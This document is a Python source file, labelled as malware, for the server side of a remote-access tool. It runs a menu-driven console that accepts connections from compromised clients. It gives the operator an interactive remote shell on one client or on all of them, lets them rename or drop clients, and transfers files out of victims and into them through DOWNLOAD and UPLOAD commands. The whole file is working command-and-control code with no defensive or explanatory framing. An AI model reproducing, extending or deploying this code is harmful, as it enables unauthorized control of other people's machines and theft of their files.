
#======> Malware <=======

# Server.py

import socket
import threading
import os
import time



clients=dict()
clients_num=0
in_client_shell=False

FORMAT="UTF-8"
PORT=12345
HOST=socket.gethostbyname(socket.gethostname())
#print(HOST)
PWD=""

BLUE = "\033[0;34m"
GREEN = "\033[0;32m"
WHITE="\033[1;37m"


def print_menu():
    global clients,clients_num,PWD
    os.system('clear')
    print()
    print(f"{BLUE}")
    print("""⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠛⠛⠛⠟⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⢀⠀⠠⢀⠀⢂⠁⡈⠐⡀⠠⢀⠀⠄⢈⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⡀⢂⠐⡈⠠⢈⠐⠀⠈⠀⠀⠀⢀⠀⠐⡀⢈⠐⡀⢂⡐⢀⠀⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡁⠄⢂⠡⠐⡀⠂⠄⠁⡀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠀⢂⠐⡠⢈⠔⡀⢂⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢋⡐⠤⡉⢄⠂⠡⢀⠁⠂⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠂⠠⠐⠠⣈⠐⡌⠰⡈⠹⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠃⣄⠸⠠⡘⢀⡘⠠⠀⠀⠄⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢀⠀⠃⡀⠄⡘⢃⠄⢣⠸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⡜⢠⢃⠱⡐⠠⢀⠀⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠁⠀⡈⠀⡐⢈⠰⡁⢎⡐⢆⡹⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⢎⡰⢃⠌⡂⡁⠂⠄⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡐⠈⠤⠑⢢⠑⣢⠐⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡏⢦⠑⡊⡔⠡⡀⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠈⠤⠉⢆⡓⢤⢋⣼⣿⣿⣿⣿
____  __  __       _                          ______
\ \ \|  \/  | __ _| |_      ____ _ _ __ ___  / / / /
 \ \ \ |\/| |/ _` | \ \ /\ / / _` | '__/ _ \/ / / / 
 / / / |  | | (_| | |\ V  V / (_| | | |  __/\ \ \ \ 
/_/_/|_|  |_|\__,_|_| \_/\_/ \__,_|_|  \___| \_\_\_\\
      
⣿⣿⣿⣿⣿⣿⢢⠅⢣⡉⢦⡱⣎⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⢢⢌⡱⣉⢶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣕⠪⡔⣡⠘⣬⢱⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣎⢇⢢⡝⡲⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢆⡱⠌⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻⣔⢣⠂⢧⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡌⢢⡓⡱⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠜⡀⠆⡱⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠳⡌⢧⡉⢶⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣇⢣⡱⢁⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠠⠈⠄⠡⠚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠑⡌⢣⢌⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⢦⠱⡈⠆⢻⣿⣿⣿⣿⣿⣿⣿⡿⠋⡀⢃⠀⠈⠐⠡⢈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠃⡐⢈⠧⣸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣇⢣⡑⡌⢂⡉⠛⡛⠛⠛⠋⠁⢀⠐⠠⢀⣤⣶⣄⠁⠂⠄⠀⡉⠛⠛⠛⠛⠋⢀⠠⢈⠢⠜⣽⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢧⡑⢎⡑⢢⠅⢢⡀⠄⠂⠌⡐⢠⣾⣿⣿⣿⣶⡀⠐⠤⢁⠂⡔⡀⢆⠰⡈⡄⢎⡰⢲⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣯⡷⣯⢧⣛⢦⡱⢌⡘⠄⡌⢹⠻⡛⣙⠻⡛⢅⠊⡔⢢⡑⢦⡹⣬⣳⣵⣻⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢧⣓⢮⡐⢣⠘⡄⠣⠐⡁⠂⢅⠊⡜⢰⢃⡎⣷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣜⢦⡝⢦⡓⣌⠲⡡⣌⠱⡌⠲⣌⠧⣞⡼⣣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⡍⠓⡯⠓⢹⡬⠗⠵⣎⠷⠩⣗⠎⠛⡞⢡⠓⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⠃⡆⠀⠀⠆⠀⠀⠆⠀⠀⢂⠀⠀⡇⢢⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡜⡠⠉⠒⠅⠂⠐⠓⠀⠒⣁⠊⢀⢣⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡽⣹⠖⡞⢦⠤⡤⠧⢤⠤⡖⢶⠺⣍⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣟⣬⢃⢧⠣⡝⣢⠝⣬⣣⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿""")
    print()

    if len(clients)==0:
        print(" There is no CLIENT yet.")

    else:
        count=1
        for key,value in clients.items():
            print(' ',count,'. ',key,value[1])
            count+=1

    print(WHITE)
    print(f"1.Send command to the CLIENT<i>\n2.Send command to ALL CLIENTS\n3.Close connection with CLIENT<i>\n4.Naming a specific CLINET\n5.Exit{BLUE}\nEnter the desired service number: {WHITE}")
            
    while True:
        input_command=input()
        choice=0
        if input_command.isdigit():
            choice=int(input_command)
            if choice<1 or choice>5:
                print(f"{BLUE}\nPlease enter a number from 1 to 5:{WHITE}")
            else:
                break
        else:
            print(f"{BLUE}\nPlease enter a number from 1 to 5:{WHITE}")

    if choice == 1:
        print(f"{BLUE}Enter the name of desired CLIENT:{WHITE}")
        client_name=input()
        x=clients.get(client_name)
        if x != None:
            os.system('clear')
            print(f"{BLUE}Enter the <exit> command to exit this shell.{WHITE}")

            clients[client_name][0].sendall('pwd\n\0'.encode(FORMAT))
            result=""
            while True:
                data=clients[client_name][0].recv(1024).decode(FORMAT)
                if not data:
                    break
                result+=data
                if result.find('\n\0') != -1:
                    result=result.replace('\n\0','')
                    break
            result=result.replace('output: ','')
            result=result.replace('\n','')    
            PWD=result   

            print(f"\n{GREEN}[shell@{client_name} {WHITE}{PWD}{GREEN}]$ {WHITE}",end="")
            command=input()
            while command != 'exit' and command!='Exit':
                send_command(clients[client_name][0],command)
                print(f"\n{GREEN}[shell@{client_name} {WHITE}{PWD}{GREEN}]$ {WHITE}",end="")
                command=input()
            PWD="" 
            print_menu()
        else:
            print(f"{BLUE}No such CLIENT found.{WHITE}")
            time.sleep(1.5)
            print_menu()

    elif choice == 2:
        os.system('clear')
        print(f"\n{BLUE}Send command to ALL CLIENTS -> Enter the <exit> command to exit this shell ::: Enter <clear> command to clear screen.\n")
        print(f"{WHITE}Enter command: ",end="")
        command=input()
        while command!='exit' and command!='Exit':
            if command == 'clear' or command == 'Clear':
                os.system('clear')
                print(f"\n{BLUE}Send command to ALL CLIENTS -> Enter the <exit> command to exit this shell ::: Enter <clear> command to clear screen.\n")
                print(f"{WHITE}Enter command: ",end="")
            else:
                for key, value in clients.items():
                    print(f"{GREEN}Result of {key}:\n{WHITE}")
                    send_command(value[0],command)
                    print('\n')
                print(f"{WHITE}Enter command: ",end="")
            command=input()
        print_menu()
        
    elif choice == 3:
        print(f"{BLUE}Enter the name of desired CLIENT:{WHITE}")
        client_name=input()
        x=clients.get(client_name)
        if x != None:
            clients[client_name][0].close() 
            clients.pop(client_name)
            print(f"{BLUE}Connection with {client_name} closed.\n{WHITE}")

        else:
            print(f"{BLUE}No such CLIENT found.\n{WHITE}")
            time.sleep(1.5)
        print_menu()

    elif choice == 4:
        print(f"{BLUE}Enter the name of desired CLIENT:{WHITE}")
        old_name=input()
        x=clients.get(old_name)
        if x != None:
            print(f"{BLUE}Enter new name:{WHITE}")
            new_name=input()
            clients[new_name]=clients[old_name]
            clients.pop(old_name)
        else:
            print(f"{BLUE}No such CLIENT found.\n{WHITE}")
            time.sleep(1.5)
        print_menu()
                
    elif choice == 5:
        for value in clients.values():
            value[0].close()  #posibility of error
        exit()


def send_command(client_socket,command):
    global PWD

    if command.find('DOWNLOAD')==-1 and command.find('UPLOAD')==-1:
        command+='\n\0'
        client_socket.sendall(command.encode(FORMAT))
        result=""
        while True:
            data=client_socket.recv(1024).decode(FORMAT)
            if not data:
                break
            result+=data
            if result.find('\n\0') != -1:
                result=result.replace('\n\0','')
                break
        if command.find('cd')!= -1: 
            result=result.replace('\n','')
            PWD=result
        else:
            print(f"{WHITE}{result}")
    else:
        command_components=list(i for i in command.split())
        if command.find('DOWNLOAD')!=-1:
            command+='\n\0'
            client_socket.sendall(command.encode(FORMAT))
            file=""
            while True:
                data=client_socket.recv(1024).decode(FORMAT)
                if not data:
                    break
                file+=data
                if file.find('\n\0') != -1:
                    file=file.replace('\n\0','')
                    break
            file=file.encode(FORMAT)
            file_name=os.path.basename(command_components[1])
            with open(command_components[2]+'/'+file_name,'wb') as new_file:
                new_file.write(file)
                print(f"\n{WHITE}Desired file downloaded successfully.")

        elif command.find('UPLOAD')!=-1:
            with open(command_components[1],'rb') as file:
                data=file.read()
                command+='\n\0'
                client_socket.sendall(command.encode(FORMAT))
                data=data.decode(FORMAT)+'\n\0'
                client_socket.sendall(data.encode(FORMAT))
                result=client_socket.recv(1024).decode(FORMAT)
                print(f"\n{WHITE}{result}")


def accept_func(socket):
    global clients,clients_num
    while True:
        client_socket,addr=socket.accept()
        clients_num+=1
        clients['Client'+str(clients_num)]=(client_socket,addr)




welcome_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
welcome_socket.bind((HOST,PORT))
welcome_socket.listen()

accept_thread=threading.Thread(target=accept_func,args=(welcome_socket,))
accept_thread.start()

print_menu()
accept_thread.join()
